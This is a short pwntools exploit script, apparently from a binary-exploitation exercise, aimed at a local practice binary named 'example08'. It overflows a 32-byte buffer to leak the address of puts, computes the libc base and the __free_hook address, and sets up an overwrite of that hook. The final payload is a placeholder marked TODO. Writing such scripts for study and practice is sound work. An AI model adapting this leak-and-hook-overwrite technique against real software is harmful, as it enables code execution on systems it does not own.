from pwn import *  # NOQA

p = process('./example08')
libc = ELF('/nix/store/7p1v1b6ys9fydg5kdqvr5mpr8svhwf4p-glibc-2.31/lib/libc.so.6')
gdb.attach(p)

p.sendline(b'aaaa')
p.recvuntil(b'aaaa\n\n')

p.sendline(b'A' * 32)
puts_leak = u64(p.recvline()[32:-1].ljust(8, b'\x00'))
print('puts', hex(puts_leak))

libc_base = puts_leak - libc.symbols['puts']
free_hook = libc_base + libc.symbols['__free_hook']

p.sendline(b'A' * 32 + p64(free_hook))
p.sendline(b'B' * 8)  # TODO: ONE GADGET FOR UBUNTU 18.04

p.interactive()
